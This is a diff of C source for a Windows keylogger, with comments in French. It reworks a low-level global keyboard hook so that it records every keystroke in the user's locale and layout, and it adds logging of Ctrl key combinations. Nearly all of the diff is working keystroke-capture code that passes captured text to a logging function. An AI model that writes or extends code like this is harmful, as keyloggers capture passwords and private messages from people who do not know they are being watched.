@@ -73,29 +73,54 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
         DWORD vkCode = pKeyboard->vkCode;
 
-        // touches spéciales human readable
+        // gestion de la locale et état des touches (AZERTY, majuscules...)
+        BYTE keyboardState[256] = {0};
+        if (!GetKeyboardState(keyboardState)) {
+            // si échec, on continue avec l'état par défaut (tous à 0)
+        }
+
+        // maj état des modificateurs spécifiques pour hook global
+        keyboardState[VK_SHIFT]   = (GetKeyState(VK_SHIFT)  & 0x8000) ? 0x80 : 0;
+        keyboardState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL)& 0x0001) ? 0x01 : 0;
+        keyboardState[VK_CONTROL] = (GetKeyState(VK_CONTROL)& 0x8000) ? 0x80 : 0;
+        keyboardState[VK_MENU]    = (GetKeyState(VK_MENU)   & 0x8000) ? 0x80 : 0;
+
+        // récup de la locale du process au premier plan
+        HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
+
+        // essayer de récupérer le caractère correspondant
+        WCHAR unicodeBuffer[8] = {0};
+        int result = ToUnicodeEx(vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 7, 0, keyboardLayout);
+
+        int ctrlDown = (keyboardState[VK_CONTROL] & 0x80) ? 1 : 0;
+        if (ctrlDown) {
+            // si ToUnicodeEx a renvoyé un caractère, l'utiliser pour logger le combo
+            if (result > 0) {
+                if (result < 7) unicodeBuffer[result] = L'\0';
+                char utf8Buffer[32] = {0};
+                WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
+                char comboBuf[64];
+                snprintf(comboBuf, sizeof(comboBuf), " [CTRL+%s] ", utf8Buffer);
+                LogKey(comboBuf);
+                return CallNextHookEx(NULL, nCode, wParam, lParam);
+            }
+
+            // sinon gérer quelques touches spéciales avec Ctrl
+            if (vkCode == VK_RETURN) { LogKey(" [CTRL+ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_TAB) { LogKey(" [CTRL+TAB] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_SPACE) { LogKey(" [CTRL+SPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            else if (vkCode == VK_BACK) { LogKey(" [CTRL+BACKSPACE] "); return CallNextHookEx(NULL, nCode, wParam, lParam); }
+            // si non reconnu, on laisse tomber pour permettre le logging normal éventuel
+        }
+
+        // touches spéciales human readable (sans Ctrl)
         if (vkCode == VK_RETURN) LogKey(" [ENTER]\n");
         else if (vkCode == VK_BACK) LogKey(" [BACKSPACE] ");
         else if (vkCode == VK_TAB) LogKey(" [TAB] ");
         else if (vkCode == VK_SPACE) LogKey(" ");
         else {
-            // gestion de la locale (AZERTY, majuscules...)
-            BYTE keyboardState[256];
-            GetKeyboardState(keyboardState);
-
-            // maj état des modificateurs spécifiques pour hook global
-            keyboardState[VK_SHIFT]   = (GetKeyState(VK_SHIFT)  & 0x8000) ? 0x80 : 0;
-            keyboardState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL)& 0x0001) ? 0x01 : 0;
-            keyboardState[VK_CONTROL] = (GetKeyState(VK_CONTROL)& 0x8000) ? 0x80 : 0;
-            keyboardState[VK_MENU]    = (GetKeyState(VK_MENU)   & 0x8000) ? 0x80 : 0;
-
-            // récup de la locale du process au premier plan
-            HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
-
-            WCHAR unicodeBuffer[5] = {0};
-            int result = ToUnicodeEx(vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 4, 0, keyboardLayout);
-
             if (result > 0) {
+                if (result < 7) unicodeBuffer[result] = L'\0';
                 char utf8Buffer[16] = {0};
                 WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
                 LogKey(utf8Buffer);
@@ -105,8 +130,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         DWORD vkCode = pKeyboard->vkCode;
         if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
             LogKey(" [CTRL] ");
-        } else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
-            LogKey(" [SHIFT] ");
         } else if (vkCode == VK_LMENU || vkCode == VK_RMENU) {
             LogKey(" [ALT] ");
         }
